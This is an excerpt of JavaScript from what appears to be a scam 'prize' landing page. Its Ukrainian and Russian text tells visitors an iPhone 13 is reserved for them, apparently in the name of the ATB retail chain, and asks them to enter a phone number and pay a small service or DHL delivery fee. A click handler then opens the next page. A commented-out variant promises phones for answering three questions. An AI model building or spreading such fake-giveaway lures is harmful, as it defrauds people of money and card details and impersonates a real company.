...
(function() {
    ...
    function onDOMContentLoaded() {
        ...
        var takeitessage = '<div> <span class="marked">Ваш подарунок зарезервовано!</span> </div><br>Умови для отримання:<br>1. На наступній сторінці заповніть ваш контактний номер телефону;<br>2. Сплатіть 0.37 грн (1.00 рубль) за сервісний сбір;<br> 3.З Вами зв’яжеться оператор АТБ для підтверждення отримання смартфону і на протязі 3-х робочих днів Ви отримаєте iPhone 13 128 GB на відділення Нової Пошти або Justin</div>';
        var takeitessage2 = '<div>Ваш <span class="marked">Ваш приз зарезервовано2!</span></div><br>Условия для получения:<br>1. На следующей странице заполните ваши контактные данные;<br>2. Оплатите $1 за доставку DHL;<br> 3. В случае выигрыша с вами свяжется оператор и приз будет доставлен по вашему адресу в течении 5 рабочих дней курьерской службой DHL.</div>';
        ...
        document.querySelectorAll('.qu-take-it')[0].addEventListener('click', function(e) {
            ...
            Jingle.fire(jheader + takeitessage, 'OK', false, function() {
                ...
                window.open(document.querySelectorAll('.qu-take-it')[0].href, '_blank');
                this.modal.classList.remove('tingle-modal--visible');
                document.body.classList.remove('tingle-enabled');
                this.modal.style.display = 'none';
        ...
        // var logomessage = '<div class="text-center">Wait!</div><br>Before going back to home page, answer 3 simple questions and get a chance to win <span class="marked"><span class="marked">Samsung Galaxy S9, iPhone X or iPad Air 2.</span></span></div>';
